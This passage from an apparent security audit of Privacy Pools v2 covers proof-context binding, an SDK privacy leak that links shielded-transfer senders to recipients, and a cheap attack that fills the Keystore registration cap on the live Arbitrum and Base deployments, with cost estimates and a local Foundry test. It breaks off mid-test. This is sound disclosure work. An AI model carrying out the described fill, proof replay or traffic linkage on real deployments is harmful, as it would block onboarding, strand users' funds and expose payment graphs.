tot_pub = tot_sig = 0
all_pub_names, hits, bad = set(), [], []

for d in circuits:
    vk = json.loads((d / "groth16_vkey.json").read_text())
    n_pub, ic = vk["nPublic"], len(vk["IC"])
    if ic != n_pub + 1:
        bad.append(f"{d.name}: IC={ic} != nPublic+1={n_pub+1}")
    sym = next(d.glob("*.sym"), None)
    if sym is None:
        bad.append(f"{d.name}: no .sym")
        continue
    pub, nsig = [], 0
    for line in sym.read_text().splitlines():
        if not line.strip():
            continue
        parts = line.split(",", 3)
        if len(parts) < 4:
            continue
        nsig += 1
        name = parts[3]
        try:
            w = int(parts[1])
        except ValueError:
            continue
        if 1 <= w <= n_pub:
            pub.append((w, name))
        if PAT.search(name):
            hits.append(f"{d.name}: w={w} {name}")
    pub = sorted(set(pub))
    tot_pub += len(pub); tot_sig += nsig
    all_pub_names.update(n.replace("main.", "").split("[")[0] for _, n in pub)
    print(f"{d.name:16s} nPublic={n_pub:2d} IC={ic:2d} signals={nsig:6d} "
          f"public={[n.replace('main.','') for _, n in pub]}")

print(f"\ntotal public signals: {tot_pub}   total signals swept: {tot_sig}")
print(f"distinct public signal names: {sorted(all_pub_names)}")
print(f"\nvkey/sym inconsistencies: {bad if bad else 'NONE'}")
print(f"DEPLOYMENT-IDENTIFIER MATCHES: {len(hits)}")
for h in hits:
    print("  HIT:", h)
print("\nRESULT:", "REFUTED - a domain tag exists" if hits else
      "CONFIRMED - no chain/pool/version signal in any of the 27 compiled circuits")
```

The third confirmed the two live deployments by read-only RPC on 2026-09-10, using `eth_getCode` against the addresses committed in `ChainDeploymentRegistry` followed by an `eth_call` of `PoolVault.keystore()` to confirm identity rather than mere existence. Both the vault named in `_arbitrumDeployment()` and the vault named in `_baseDeployment()` returned the keystore their registry entry declares.

What was not executed, stated plainly. No replay was submitted to any chain, fork or local deployment, so the claim that a replayed deposit proof is accepted by a second live vault rests on the portability result plus the shared verifier bytecode rather than on an observed acceptance. No proof-of-concept contract or Foundry test was written for the front-run sequence. The circuits' own mocha suite could not be run, because the `circom` compiler is absent from this environment. The bridge aggregator is not vendored into this repository, so no destination-side behaviour was verified, including what happens to the bridged principal after the destination deposit reverts. The on-chain deployment check was two read-only RPC calls per address; it establishes that code is deployed and that each vault returns the keystore its registry entry declares, and it establishes nothing about usage, balances or activity.

#### Recommendation

We recommend folding chain and vault identity into both context preimages: `keccak256(abi.encode(block.chainid, address(this), _noteData))` in `PoolVault.deposit`, and `keccak256(abi.encode(block.chainid, address(this), _transactParams, _noteData))` in `PoolVault.transact`, with the SDK's context construction updated to match so that honestly built proofs still verify. The domain tag alone does not close the reshield front-run, because the tag would name the destination vault the proof was legitimately aimed at all along and the attacker is submitting it to exactly that vault, so `deposit` also needs a submitter binding, mirroring the `_transactParams.processor == msg.sender` check that `transact` already has: commit the intended submitter's address into the deposit context and require the caller to match it, so only the party the prover named can land the deposit. As defence in depth on the privacy leg, we suggest reviewing whether the destination deposit proof has to travel in source-chain calldata at all, or whether it can reach the bridge executor out of band. This change needs no new proving keys and no new trusted setup ceremony, and the reason is visible in the circuit, where the entire treatment of `context` inside `Transact.circom` is this:

```circom
// ===== PUBLIC INPUT BINDING =====
// Bind context to prevent proof malleability.
// Note: The `context * context` constraint forces `context` into the R1CS witness and public inputs.
// When context != 0, this creates a non-trivial constraint binding the proof to the specific context.
// The contract guarantees context is never 0, even in the null case (pure transfer),
// context is set to the hash of empty bytes, ensuring the binding is always effective.
signal contextSquared;
contextSquared <== context * context;
```

`context` appears in no other constraint. It is not hashed, not compared, not decomposed, and not fed into any commitment or nullifier. The one constraint that exists squares it into a signal nothing else reads, and the comment says why: squaring is what forces `context` to appear in the public inputs at all. To the circuit, `context` is an opaque field element, so changing what it is a hash of changes no constraint: the R1CS comes out identical, and so do the verifying key and the proving key. The preimage is computed entirely on the contract side, in the `require` shown at the top of this finding, so the fix is a contract change and all 27 committed `.zkey` proving-key files, and the ceremony that produced them, are untouched.

We also recommend keeping circuit-side work on a separate track and correcting the documentation. Mixing a domain tag into the nullifier preimage, or giving `ragequit` a `context` public signal it currently lacks, are circuit changes: they alter the constraint system, so they do require recompilation and a fresh ceremony, and they close a different risk from the one above, so bundling them together would make the cheap contract fix inherit the long schedule. Separately, correct the `tokenId` and `chainId` entries in the cryptography glossary so they describe what is built, or implement the definition they give, because as written a reader working from the glossary will assume a cross-chain collision control that the code does not have.

#### Verification

**Verdict: CONFIRMED** by an executed proof of concept. The drop path, the run command and the expected output are given in the proof-of-concept section above.

### #018 — Note discovery queries the ASP once per held label, linking a shielded transfer's sender to its recipient

**Severity:** Medium · **Location:** `packages/sdk/src/services/poolSessions/PoolSessionNoteDiscovery.ts` · **Bug:** High · **Payout:** Medium · **Novelty:** NEW · **Reach:** PRIV · **Status:** Open

#### Description

Every note in the pool carries a label, the lineage identifier of the deposit that funded it. An association-set provider (ASP) decides which deposits may keep circulating and commits that verdict to a set whose leaves are hashes of labels rather than labels themselves, so that an observer cannot partition the anonymity set by looking up any particular deposit's status. A client still has to know where its own notes stand, so note discovery, the sweep a client makes to find and refresh what it holds, gathers the labels of those notes and asks the provider about each one over HTTP.

An internal transfer is the part of the system that is supposed to reveal nothing: its on-chain record is commitments and nullifiers with a zero asset field and zero value, the event a spend or a transfer emits carries no label, and no spend circuit exposes one publicly. The label itself, though, is inherited. A note minted for the recipient of a transfer keeps the label of the sender's deposit, a deposit the recipient had no part in and whose secret the recipient never holds, and note discovery treats it exactly like a label of the recipient's own.

**Where it breaks.** The lookup rebuilds over HTTP the per-deposit oracle the on-chain design withholds, and the party it exposes is not the party making the request:

- on chain, the association set commits only to the hash of a label, precisely so that an observer cannot partition the anonymity set by brute-forcing a published status flag;
- over HTTP, a holder's client asks about one label hash at a time, in the URL path, from its own network address, and the provider already knows which depositor that label belongs to.

So when the recipient of a shielded transfer syncs, the recipient's client asks the provider about the sender's deposit, and the provider gains an ordered edge from sender to recipient for a payment that left nothing on chain to link them; a label survives arbitrarily many hops, so repeated across clients those lookups assemble a payment graph over the shielded layer, with per-hop timing, in which the depositor named made no request and has no way to know it happened.

In `PoolSessionNoteDiscovery`, the private `getLabelStatus` method collects the labels of every note the session holds, dedupes them into a `Set`, and issues one HTTP GET per unique label through `Promise.all`. `HttpASPDataProvider.getLabelStatus` puts the label hash into the URL path, `` `${this.aspUrl}/labels/${decimalLabel}/status` ``. The label is a private signal inside the deposit circuit and never appears on chain; the association set takes `Poseidon(label)`, the label hash, as its leaves.

The repository's own specification says why that datum is withheld, in the "Leaf Structure" bullet under "`associationSet` Tree" in `docs/tech-design/overview.md`:

> "Leaf Structure: To prevent observers from partitioning the anonymity set by brute-forcing a public `status` flag, the leaves of this tree commit only to a hash of the label: `leaf = Poseidon(label)`."

The SDK then rebuilds that per-label status oracle over HTTP, one label at a time, from the holder's own client.

Two bounds come first. For a note the session deposited itself the loop discloses close to nothing: the deposit's ASP ciphertext carries `depositSecret` encrypted to the ASP's own key and `Entrypoint.deposit` emits `Deposited` with `_depositor` indexed in the same transaction, so the ASP already derives `depositor -> labelHash` at deposit time by design.

Nor is an on-chain join available to anyone else at this commit. Of the 41 `event` declarations under `packages/contracts/src/`, two name a label: `IASPRegistry.LabelRegistered(bytes _ciphertext)`, carrying only that encrypted payload, and `IPoolVault.Ragequit`, whose `@param label` line calls the field "The label hash exposed for ASP tracking". `IPoolVault.Transacted`, emitted by a normal spend or transfer, carries none, and `label[nInputs]` and `outputLabel[mOutputs]` are private input signals in `Transact.circom`, absent from the `component main` public lists of all 25 spend circuits. A label on any of those events or public signal lists would falsify this. There is none.

The case that remains is a transfer-acquired note. The `OUTPUT LABEL INHERITANCE` block in `ValueConservation` constrains every output label to equal some input label through `labelInherited[o].out === 0` over the per-output match sum, and `TransactOrchestrator.getTransactOutputNotes` mints the change note and the recipient note under the input note's `label`. Such a note carries the label of somebody else's deposit, whose `depositSecret` the recipient never held: the `NoteLineage` docstring records the secret as "absent on lineages received via transfer, payment request, or note discovery".

Note discovery does not distinguish provenance: the `Note` literal `discoverNotes` builds sets `label: disc.label` whatever path found it, and `syncNotesStatus` hands the PENDING, ACTIVE and REJECTED working sets to `getLabelStatus` in one array. So when Bob receives a shielded transfer from Alice, Bob's client asks the ASP about Alice's label from Bob's network vantage point, and the ASP, which already maps that label to Alice's depositing address, gains the ordered edge Alice to Bob for a transaction whose on-chain record is commitments and nullifiers with a zero asset field and zero value. A label survives arbitrarily many hops, so successive queries of one label from different clients yield a payment path rather than a single edge, and one client's burst of three labels places three depositors upstream. Ordering follows from which client queried a label first, not from a label's disappearance from a query set: `changeNotes.push` in `getTransactOutputNotes` runs on every spend, including at zero change value, so a partial sender keeps querying the same label.

The label hash sits in the URL path rather than a request body, so it appears in any request line an intermediary logs: CDN, load-balancer and web-application-firewall access logs, not only the ASP application. The `NO_STORE` option passed alongside the URL governs browser caching, as its comment says, and has no bearing on logging. No application-level identifier is available to join on either: `HTTPClient.request` calls global `fetch` with no credentials and `HTTPClientConfigSchema` has no field for an API key or token, so any join the ASP makes is network-level.

Attribution of one burst to one client depends on the transport. Against local loopback servers under Node v23.7.0, twelve labels fetched concurrently through `Promise.all` opened twelve separate TCP connections carrying one request each rather than one keep-alive connection, and repeating the pass 200 ms later reused all twelve client source ports, so consecutive passes are linkable at the connection level. Over TLS against a server advertising HTTP/2 through ALPN, `fetch` still negotiated HTTP/1.1 and opened eight connections for eight labels. The join key is therefore source IP plus a sub-second burst of N distinct label paths plus that socket-pool reuse, rather than a session handle.

The measurements reproduce the SDK's transport shape on loopback, not observed production traffic, and no ASP endpoint was contacted. The ASP service lives in a separate repository, so whether the deployed endpoint, or anything terminating TLS in front of it, logs request lines with client IPs is unverified; if it strips them and no CDN sits in front, what remains is the grouping of one client's whole label set into a single burst. The share of users holding transfer-acquired notes, the affected population, is unmeasured.

`getLabelStatus` is the only one of the six ASP endpoints on `HttpASPDataProvider` keyed on a user-specific value; `getRoot` and `getLeaves` fetch the root and the whole leaf set scoped with `?chainId=&entrypoint=`, and the client builds its membership proofs locally from that full set. Neither `agents/deviations.md`, the repository's register of conscious design deviations, nor the endpoint's entry in `docs/tech-design/sdk/asp-client.md` takes a privacy position on it, while the `encryptForASP` entry there carries an explicit anti-deanonymization rationale.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionNoteDiscovery.ts#L692-L706
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/aspDataProviders/HttpASPDataProvider.ts#L97-L109
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/circuits/circuits/templates/helpers/ValueConservation.circom#L144-L160
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/TransactOrchestrator.ts#L587-L611
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/Entrypoint.sol#L89-L91
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/docs/tech-design/overview.md#L116-L118

#### Impact

The object disclosed is a payment graph over the shielded layer, held by one party, with per-hop timing and no on-chain footprint. Internal transfers are the product rather than an edge case: `overview.md` opens by describing the need for a v2 that functions as "a complete private payment system: private by default, with support for private receives where the sender never learns the recipient's address, and internal transfers that allow funds to move entirely within the shielded layer".

Each edge exposes two parties and only one of them made a request. The second is the upstream depositor, named as a counterparty by somebody else's client, with no way to know it happened. The recipient, whose client issued the query, has no way to decline either: `DiscoverNotesParams` has no flag for it, `discoverNotes` awaits `syncNotesStatus` on every pass that finds new blocks to scan, and `IpfsASPDataProvider.getLabelStatus` throws unconditionally, so the HTTP provider is the one any provider fallback can reach.

Nothing is at risk but information, and the documented sender-privacy promise is scoped to observers and recipients rather than to the ASP: section 3.2 of `key-architectural-concepts.md` concludes that the private-label design "is the key to preserving sender privacy from recipients". The ASP is a defined protocol role and the intended decryptor throughout, so the parties that gain are the ASP and whoever terminates its TLS or holds its logs. The datum disclosed is nonetheless the one the "Leaf Structure" bullet declines to publish on chain, for the reason quoted there.

#### Recommendation

We recommend replacing the per-label fan-out in the private `PoolSessionNoteDiscovery.getLabelStatus` with a bulk fetch shaped like `HttpASPDataProvider.getLeaves`: one request returning the full status list, or a bitmap over the published leaf set, filtered client-side. That removes the oracle instead of narrowing it, and it matches the pattern the SDK already uses for association-set membership. It does need an ASP-side route that does not exist today: no batch label endpoint appears on the ASP data-provider interface, and `HttpASPDataProvider.getLabelStatus` is the only `/labels/` URL the SDK constructs. If per-label lookup has to stay, move the label hash out of the URL path into a POST body so it stops appearing in request lines, send all labels in one request instead of one per label, pad the set with decoy labels drawn from the leaf set the client already downloads in full through `getLeaves`, and add `chainId` and `entrypoint` so that `getLabelStatus` scopes like `getRoot`, `getLeaves`, `getEventSnapshot` and `getNoteEvents`.

We also recommend establishing and writing down whether the deployed ASP, or anything terminating TLS in front of it, logs request lines with client IP addresses and with what retention, since that is the one prerequisite above that could not be verified from this repository and a negative answer removes most of the mechanism. `agents/deviations.md` and `docs/tech-design/` currently say nothing about what the ASP is entitled to learn from client queries, and the `getLabelStatus` entry in `asp-client.md` could carry a privacy rationale in the same form as the `encryptForASP` entry.

#### Verification

**Verdict: CONFIRMED** by reading the named functions against the reviewed commit, and by the permalinked sources in the evidence section above.

### #019 — One funded EOA can fill the `Keystore` registration cap for a few ETH, permanently ending onboarding

**Severity:** Low · **Location:** `packages/contracts/src/contracts/Keystore.sol` · **Bug:** High · **Payout:** Low · **Novelty:** NEW · **Reach:** PERM · **Kill chain:** KC-02 · **Status:** Open

#### Description

An account that wants to move value in Privacy Pools v2 registers once with its chain's `Keystore`, which appends a single leaf for that account to a shared tree. That leaf is what lets the account later prove, in zero knowledge, that it is entitled to spend a note, and both ways out of the pool need it: the compliance-gated spend, and `ragequit`, the escape hatch a depositor uses to take their own money back without anyone's approval. A relayer may register an account on its behalf and pay the gas, which is how a user holding no ETH on that chain is onboarded.

The tree is append-only and holds at most 262,144 leaves. Nothing ever removes one, so that ceiling counts every account that has ever registered on the chain rather than the accounts using it now, and reaching it stops registration for everybody, with no slot ever freed afterwards. Governance has exactly one lever aimed at that state, the setter that raises the cap.

**Where it breaks.** Taking a slot costs gas and nothing else, and the slot is charged to the account being registered rather than to the account paying:

- one funded address can generate 262,144 keypairs offline, sign an authorization for each and submit them all itself, so filling the tree takes one funded account and not 262,144;
- a full fill costs roughly 1 to 3 ETH on Arbitrum and Base, the two chains carrying live deployments;
- nothing meters or prices registration, the contract has no pause that would slow a fill, and no function hands a leaf back;
- the lever governance holds makes things worse rather than better: on a full tree the smallest cap the setter will accept is the one that admits the leaf taking the keystore past the depth every deployed circuit was compiled for, after which nobody can spend or exit at all.

So for a few ETH one unprivileged account can end onboarding on a live chain for good, and the damage does not stop at the door: deposits keep working, nothing on the deposit or transfer path requires the owner of a note to be registered, and notes go on arriving for owners who cannot spend or exit them until governance replaces or upgrades the contract.

Privacy Pools v2 keeps each deployment's shielded value in a `PoolVault` and keeps the identities allowed to move that value in a separate contract, the `Keystore`. Both spend paths demand the same proof of identity: `transact`, the compliance-gated spend, and `ragequit`, the escape hatch a depositor uses to withdraw their own note without approval from the Association Set Provider. Each verifies a Groth16 proof containing a Merkle-inclusion proof of the spender's leaf in the keystore tree, and the vault checks that proof's root by calling `keystore.isKnownRoot(...)`. An account with no keystore leaf can produce no such proof and can therefore spend nothing, by either path.

Getting a leaf is called registering, and it is open to anyone. `setAuthPolicy` registers the caller; `setAuthPolicyWithSig` registers whatever account signed an EIP-712 authorization, which lets a relayer pay the gas for a user who holds no ETH on the chain yet. Both land in the same internal `_setAuthPolicy`, which hashes the account address together with a nullifying-key hash and an auth digest, both derived from material the user holds, into a single leaf and appends it to the tree. `_setAuthPolicy` fixes one nullifying key per account permanently with `require(nullifyingKeys[_account] == 0)`, and while `updateAuthPolicy` rotates the auth digest in place later, registration itself is one-way: an account registers once, and nothing lets it deregister.

The keystore tree is a LeanIMT, which is append-only, and its leaf count is capped by a storage variable, `maxKeystoreTreeSize`, set to `262_144` (`2^18`) in every chain config. Because nothing is ever removed, that cap is a lifetime total rather than a concurrent limit: it counts every account that has ever registered on that chain, including accounts that registered once and were never used again. `Deploy.run` deploys one `Keystore` per chain through `_deployKeystore`, so the cap is protocol-wide rather than per-pool. One role governs the response: `UPGRADER_ROLE`, checked through the access router by the `checkAccess` modifier, owns `setMaxKeystoreTreeSize`, `setKeystoreRootLiveness`, the `Keystore`'s own UUPS `_authorizeUpgrade`, and `PoolVault.setKeystore`. `PAUSER_ROLE` is not in the picture: it pauses `PoolVault`, and `Keystore` inherits no pausable behaviour at all.

In the `Keystore` contract, the whole defence against exhausting that cap is a single `require` at the end of `_setAuthPolicy`:

```solidity
// Keystore._setAuthPolicy
require($.nullifyingKeys[_account] == 0, Keystore_AuthPolicyAlreadySet());
require(_nullifyingKeyHash != 0, Keystore_InvalidNullifyingKeyHash());

uint256 _authLeaf = PoseidonT4.hash([uint256(uint160(_account)), _nullifyingKeyHash, _authDigest]);

require($.keystoreTree.size + 1 <= $.maxKeystoreTreeSize, Keystore_KeystoreTreeFull());
```

Registration is permissionless, unmetered and one-shot per address. The relayed entry point `setAuthPolicyWithSig` keys every guard and the leaf on `_account` rather than on `msg.sender`, which the NatSpec on `_setAuthPolicy` calls deliberate, the on-chain result being "indistinguishable from self-registration". One funded EOA can therefore generate 262,144 keypairs offline, sign 262,144 EIP-712 authorizations and submit them all; it does not need 262,144 funded accounts. Pausing cannot slow a fill down, since the file imports no `PausableUpgradeable` and carries `whenNotPaused` on no function, and no slot is ever recovered: `_remove` exists in the vendored `InternalLeanIMT` library and has zero call sites under `packages/contracts/src`.

Taking roughly 200k gas per registration, the figure measured at the function level over 13 real calls against a real `Keystore`, a full fill is about 5.2e10 gas. On Arbitrum and Base that is roughly 1 to 3 ETH for an attacker with no profit motive; on Ethereum mainnet at 5 to 12.5 gwei it is roughly 260 to 650 ETH. `ChainDeploymentRegistry._mainnetDeployment` reverts "mainnet not deployed yet", while `_arbitrumDeployment` and `_baseDeployment` carry live addresses whose keystores return a non-zero `currentRoot` over RPC, so the two chains where the attack is affordable are the two that are deployed and already carrying registrations.

The damage is narrower than the shape of the bug suggests. Across `packages/contracts/src` and `packages/contracts/script`, `keystoreTree.size` is read in exactly two places: the `_maxKeystoreTreeSize > keystoreTree.size` lower bound in `setMaxKeystoreTreeSize`, and the `keystoreTree.size + 1 <= maxKeystoreTreeSize` gate in `_setAuthPolicy`. Every other consumer reads the root, and a full tree still has a valid current root, so `transact` and `ragequit` both keep verifying and `Keystore.updateAuthPolicy`, which reads the size not at all, keeps rotating keys. Users already registered keep full use of their notes, including the `ragequit` exit. A third reader of the size, or any consumer gating on occupancy rather than on the root, would falsify that.

What saturation kills is onboarding, permanently and for everyone:

| consumer | path to the capacity gate | outcome at capacity |
| --- | --- | --- |
| `Keystore.setAuthPolicy` | straight into `_setAuthPolicy` | reverts `Keystore_KeystoreTreeFull` forever |
| `Keystore.setAuthPolicyWithSig` | same, after the EIP-712 signature check | same, and it is also the attacker's own fill vector |
| `PrivacyPoolRelay.registerAndRelay` | its `setAuthPolicyWithSig` call on `POOL.keystore()`, with no try/catch before `_relay` | the sponsored onboard-and-first-withdraw product dies; the revert from the register leg bubbles and takes the bundled withdrawal with it |
| `PoolVault.deposit` / `Entrypoint.deposit` | no keystore read at all | keeps succeeding, so the unregistered-owner population grows after saturation |

The last row is what turns a closed door into stranded value. A case-insensitive search for `keystore` over `Entrypoint.sol` returns zero hits, and `PoolVault.deposit` verifies only a deposit proof, so nothing on the deposit path requires the note's owner to be registered while both spend paths do. Such an owner has no path to their funds until governance acts, and three routes produce one, the third by design:

| route | evidence |
| --- | --- |
| deposit without registering | `PoolVault.deposit` verifies `depositVerifier.verify(_proof)` and reads no keystore anywhere in the function |
| a registered user transfers to an unregistered recipient | the `Transact` template takes `outputNoteAddressHash` as `Poseidon(ownerAddress, noteSecret)` and constrains nothing about the recipient's registration |
| registration deferred to first spend | `WitnessPreparationService` anchors the witness to a predicted post-insertion root when `pendingKeystoreRegistration` is set, "for a bundled `registerAndRelay`"; the `INTL-05` row of `agents/deviations.md` names the "fresh unfunded recipient" as the motivating flow |

Saturation is also invisible from outside until it bites. The seven external views on `Keystore` and every view declaration on `IKeystore` expose `maxKeystoreTreeSize()` and not the current leaf count, so the first signal of saturation is registrations reverting for real users. An external view returning the occupancy would falsify that.

Two properties bound how bad a fill gets. Recovery needs no circuit recompile and no new trusted setup, because the `NoteCommitment` template takes five inputs and none is a keystore root, leaf or index, and the keystore leaf is a pure function of user-held material, the `KeystoreLeaf` template computing `Poseidon(ownerAddress, Poseidon(privateNullifyingKey), authDigest)`. `PoolVault.setKeystore` therefore re-points the vault at a fresh `Keystore`, every existing user re-registers a byte-identical triple, and existing notes stay spendable; an in-place UUPS upgrade adding a fee or an allowlist is cheaper still. And the stranded owners are locked out until governance acts rather than dispossessed. What survives is that recovery costs every registered user a re-registration transaction and an SDK-side migration, and that the attacker can refill the new tree at the same price, so without a registration gate this is a repeatable griefing war rather than a one-shot brick.

The obvious remedy is worse than the condition. At saturation the only function on the `Keystore` interface that addresses "the tree is full" is `setMaxKeystoreTreeSize`, which is bounded against the current tree size and against nothing else, so its smallest legal argument, `262_145`, is exactly the one that admits the leaf taking the keystore past the depth every deployed circuit is compiled for. Once the last superseded root expires `keystoreRootLiveness` seconds later, 1200 in all four configs, no prover can satisfy `transact` or `ragequit`.

A disposition for this mechanism is already recorded and unshipped. The `#660` entry in `agents/output/REMEDIATION_SUMMARY.md` records it at High, including the stranded-deposit leg, with the disposition "Accepted & documented (tree-size class)" and an operational forward fix: "run the trusted setup at keystore depth 22 before launch (or expand the tree later)". At this commit every circuit in `circuits.json` is still at keystore depth 18 and every config in `ChainConfigRegistry.sol` still reads `262_144`. A circuit entry at depth 22, or any config above `262_144`, would falsify that.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/Keystore.sol#L202-L212
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/Keystore.sol#L138-L144
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PrivacyPoolRelay.sol#L102-L113
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/script/registries/ChainConfigRegistry.sol#L106-L109

#### Impact

Every prospective user of the affected deployment is blocked from registering, and the block is permanent until governance replaces or upgrades the `Keystore`. The gasless onboarding product goes with it: `registerAndRelay` bundles registration and first withdrawal atomically, so a full tree makes the whole bundle revert for any account not already registered. Deposits keep working throughout, so the population holding notes they cannot spend grows for as long as the condition lasts, and that population is not hypothetical, since deferred registration is the designed flow for a fresh recipient. The budget does not need an attacker to consume it either: `PrivacyPoolRelay.relayAndAnnounce` pays to fresh stealth addresses, each of which needs its own keystore leaf before it can spend, so the 262,144 slots are drawn down at payment rate rather than at user rate.

Registered users are untouched. Their notes stay spendable by both exits, because every spend-side gate reads the root and the root stays valid, so a fill on its own reaches no fund loss. The compound case is the one worth planning against: an operator who reaches for `setMaxKeystoreTreeSize`, the only lever the interface offers for a full tree, and sets it to `262_145` hands any actor a one-transaction follow-up that pushes the keystore past its compiled depth, after which no user can `transact` and no user can `ragequit`. Recovery from that state is a coordinated depth bump across 26 circuits with a new trusted setup and re-pointed verifiers, or `PoolVault.setKeystore` onto a fresh instance with mass re-registration.

#### Proof of concept

The terminal revert is executed by the repository's own suite. `forge test --match-path test/unit/Keystore.t.sol --match-test GivenKeystoreTreeIsAtCapacity` passes both `test_SetAuthPolicy_GivenKeystoreTreeIsAtCapacity` and `test_SetAuthPolicyWithSig_GivenKeystoreTreeIsAtCapacity` at 1000 fuzz runs each, and the second uses `vm.prank(_relayer)` with a signature from a different `_account`, so it executes the relayed-by-a-third-party shape this finding relies on. The `registerAndRelay` leg was executed one step short of the exact revert: `forge test --match-path test/unit/PrivacyPoolRelay.t.sol --match-test RegisterAndRelay` passes `test_RegisterAndRelay_WhenTheKeystoreRegistrationReverts` at 1000 runs, whose own comment states the asserted behaviour as "bubble up the revert and not relay (pool transact must never be called)". That test mocks the keystore to revert `Keystore_InvalidSignature` rather than `Keystore_KeystoreTreeFull`, so what it executes is the bubbling; the tree-full case follows from the same unguarded `setAuthPolicyWithSig` call rather than from the test itself.

The test below saturates a real `Keystore` end to end, with no mock anywhere in the insert path. It drops into `packages/contracts/test/unit/` as `KeystoreCapacityEdges.t.sol` and runs with `forge test --match-path test/unit/KeystoreCapacityEdges.t.sol`; all 10 cases pass at this commit. `test_MaxSizeZeroAndOne` is the case that carries this finding: it deploys a `Keystore` behind an `ERC1967Proxy` with `maxKeystoreTreeSize = 0` and shows `setAuthPolicy` reverting `Keystore_KeystoreTreeFull` at the first registration, then deploys one with `maxKeystoreTreeSize = 1`, registers a real user, and shows a second real account reverting with the same error. That is the capacity gate at reduced scale, reached by real registrations rather than by a harness write. The same file pins the boundaries around it that this finding leans on: the superseded root expiring at the exact second rather than after it, a zero `keystoreRootLiveness` dropping the superseded root immediately, and the `setAuthPolicyWithSig` signature edges.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.32;

import {IAccessControl} from '@openzeppelin/contracts/access/IAccessControl.sol';
import {ERC1967Proxy} from '@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol';
import {IKeystore} from 'interfaces/IKeystore.sol';
import {SNARK_SCALAR_FIELD} from 'lean-imt/Constants.sol';
import {Keystore} from 'contracts/Keystore.sol';
import {TestUtils} from 'test/unit/helpers/TestUtils.sol';

/// @notice Keystore capacity and boundary coverage. Not part of the repository's own test suite.
contract KeystoreCapacityEdges is TestUtils {
  Keystore internal keystore;
  address internal user = makeAddr('user');
  uint256 internal constant LIVENESS = 600;

  function _fresh(uint256 _liveness, uint256 _maxSize) internal returns (Keystore _k) {
    Keystore impl = new Keystore(IAccessControl(mockAccessRouter));
    _k = Keystore(address(new ERC1967Proxy(address(impl), '')));
    _k.initialize(_liveness, _maxSize);
  }

  function setUp() external {
    keystore = _fresh(LIVENESS, 1 << 18);
  }

  /// EDGE zero: authDigest == 0 is accepted, nullifyingKeyHash == 0 is not.
  function test_ZeroAuthDigestAccepted_ZeroNullifyingKeyRejected() external {
    vm.prank(user);
    vm.expectRevert(IKeystore.Keystore_InvalidNullifyingKeyHash.selector);
    keystore.setAuthPolicy(1, 0);

    vm.prank(user);
    keystore.setAuthPolicy(0, 1); // authDigest == 0 is fine
    assertEq(keystore.nullifyingKeys(user), 1);
  }

  /// EDGE max: field modulus and modulus-1.
  function test_FieldModulusBoundary() external {
    vm.prank(user);
    vm.expectRevert(IKeystore.Keystore_OutOfScalarField.selector);
    keystore.setAuthPolicy(SNARK_SCALAR_FIELD, 1);

    vm.prank(user);
    keystore.setAuthPolicy(SNARK_SCALAR_FIELD - 1, 1); // p-1 accepted
  }

  /// EDGE empty state: root is 0 and isKnownRoot(0) is false before any registration.
  function test_EmptyKeystore_RootZeroIsNotKnown() external view {
    assertEq(keystore.currentRoot(), 0);
    assertFalse(keystore.isKnownRoot(0));
  }

  /// EDGE cap: maxKeystoreTreeSize == 0 bricks registration entirely; == 1 admits exactly one.
  function test_MaxSizeZeroAndOne() external {
    Keystore k0 = _fresh(LIVENESS, 0);
    vm.prank(user);
    vm.expectRevert(IKeystore.Keystore_KeystoreTreeFull.selector);
    k0.setAuthPolicy(1, 1);

    Keystore k1 = _fresh(LIVENESS, 1);
    vm.prank(user);
    k1.setAuthPolicy(1, 1);
    vm.prank(makeAddr('user2'));
    vm.expectRevert(IKeystore.Keystore_KeystoreTreeFull.selector);
    k1.setAuthPolicy(1, 1);
  }

  /// EDGE liveness expiry: strictly-less-than, so the superseded root dies AT validUntil, not after.
  function test_SupersededRootExpiresAtExactSecond() external {
    vm.prank(user);
    keystore.setAuthPolicy(1, 1);
    uint256 r1 = keystore.currentRoot();

    vm.prank(makeAddr('user2'));
    keystore.setAuthPolicy(2, 2);
    uint256 validUntil = keystore.previousRoots(r1);
    assertEq(validUntil, block.timestamp + LIVENESS);

    vm.warp(validUntil - 1);
    assertTrue(keystore.isKnownRoot(r1), 'valid one second before expiry');
    vm.warp(validUntil);
    assertFalse(keystore.isKnownRoot(r1), 'INVALID at the exact expiry second');
  }

  /// EDGE zero liveness: a superseded root is dead in the same block it is superseded.
  function test_ZeroLiveness_SupersededRootDiesImmediately() external {
    Keystore k = _fresh(0, 1 << 18);
    vm.prank(user);
    k.setAuthPolicy(1, 1);
    uint256 r1 = k.currentRoot();
    vm.prank(makeAddr('user2'));
    k.setAuthPolicy(2, 2);
    assertEq(k.previousRoots(r1), block.timestamp);
    assertFalse(k.isKnownRoot(r1), 'zero liveness -> no grace at all');
  }

  /// EDGE equality: updating a leaf to ITSELF reverts inside LeanIMT rather than no-op'ing.
  function test_UpdateToSameDigest_RevertsLeafAlreadyExists() external {
    vm.prank(user);
    keystore.setAuthPolicy(7, 1);
    uint256[] memory sibs = new uint256[](0);
    vm.prank(user);
    vm.expectRevert(bytes4(keccak256('LeafAlreadyExists()')));
    keystore.updateAuthPolicy(7, 7, sibs);
  }

  /// EDGE one: single-leaf tree, update succeeds with an empty sibling array (depth 0).
  function test_UpdateSingleLeafTree_EmptySiblings() external {
